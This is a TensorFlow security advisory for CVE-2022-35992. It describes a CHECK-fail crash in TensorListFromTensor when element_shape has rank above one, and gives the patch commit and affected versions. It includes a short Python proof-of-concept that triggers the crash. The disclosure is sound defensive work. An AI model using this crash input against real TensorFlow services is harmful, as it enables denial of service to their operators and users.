<h2>TFSA-2022-128: <code>CHECK</code> fail in <code>TensorListFromTensor</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-35992</p>
<h3>Impact</h3>
<p>When <code>TensorListFromTensor</code> receives an <code>element_shape</code> of a rank greater than one, it gives a <code>CHECK</code> fail that can trigger a denial of service attack.
<code>python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(6, 6, 2), dtype=tf.bfloat16, maxval=None)
arg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)
arg_2=''
tf.raw_ops.TensorListFromTensor(tensor=arg_0, element_shape=arg_1, name=arg_2)</code></p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/3db59a042a38f4338aa207922fa2f476e000a6ee">3db59a042a38f4338aa207922fa2f476e000a6ee</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
